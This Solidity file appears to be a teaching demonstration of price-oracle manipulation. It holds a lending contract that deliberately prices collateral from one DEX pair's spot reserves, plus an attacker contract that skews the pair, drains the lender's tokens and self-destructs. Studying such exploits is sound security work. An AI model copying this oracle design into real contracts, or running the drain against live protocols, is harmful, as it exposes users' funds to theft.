// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./utils/MinimalDex.sol";

contract OracleManipulationVulnerable {
    IERC20 public token;
    MinimalDex public dexPair;

    uint256 public constant DEPOSIT_FACTOR = 2;

    mapping(address => uint256) public deposits;

    constructor(IERC20 _token, MinimalDex _dexPair) {
        token = _token;
        dexPair = _dexPair;
    }

    // Allows borrowing tokens by first depositing two times their value in ETH
    function borrow(uint256 amount) public payable {
        uint256 depositRequired = calculateDepositRequired(amount);

        require(msg.value >= depositRequired, "Not enough ETH for collateral");

        if (msg.value > depositRequired) {
            (bool sc,) = payable(msg.sender).call{value: msg.value - depositRequired}("");
            require(sc, "Transfer failed.");
        }

        deposits[msg.sender] += depositRequired;

        // Fails if the pool doesn't have enough tokens in liquidity
        token.transfer(msg.sender, amount);
    }

    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
        return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
    }

    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        (uint256 reserveToken, uint256 reserveEther) = dexPair.getReserves();
        return reserveEther * 10 ** 18 / reserveToken;
    }
}

contract OracleManipulationAttacker {
    IERC20 public token;
    MinimalDex public dexPair;
    OracleManipulationVulnerable vulnerable;

    constructor(IERC20 _token, MinimalDex _dexPair, OracleManipulationVulnerable _vulnerable) {
        token = _token;
        dexPair = _dexPair;
        vulnerable = _vulnerable;
    }

    function attack() public payable {
        // Sell Payment token for Ether
        token.transferFrom(msg.sender, address(this), token.balanceOf(msg.sender));
        token.approve(address(dexPair), token.balanceOf(address(this)));

        // Manipulate the price of the token by selling it for Ether
        // and creating a imbalance in the Pair Pool
        dexPair.tokenToEthSwap(token.balanceOf(address(this)), 1);

        // Borrow all the tokens from the vulnerable contract
        uint256 amountToPay = vulnerable.calculateDepositRequired(token.balanceOf(address(vulnerable)));
        vulnerable.borrow{value: amountToPay}(token.balanceOf(address(vulnerable)));

        // Transfer the tokens to the attacker wallet
        token.transfer(msg.sender, token.balanceOf(address(this)));
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}
